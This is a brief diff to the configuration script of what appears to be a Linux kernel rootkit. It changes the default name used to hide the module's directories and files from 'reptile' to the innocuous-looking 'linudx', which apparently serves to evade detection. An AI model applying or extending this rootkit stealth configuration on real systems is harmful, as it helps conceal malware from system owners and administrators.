@@ -102,7 +102,7 @@ function random_gen {
 }
 
 function config_gen {
-	load_config "Hide name (will be used to hide dirs/files)" "reptile"
+	load_config "Hide name (will be used to hide dirs/files)" "linudx"
 	MODULE=$RETVAL
 	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
 
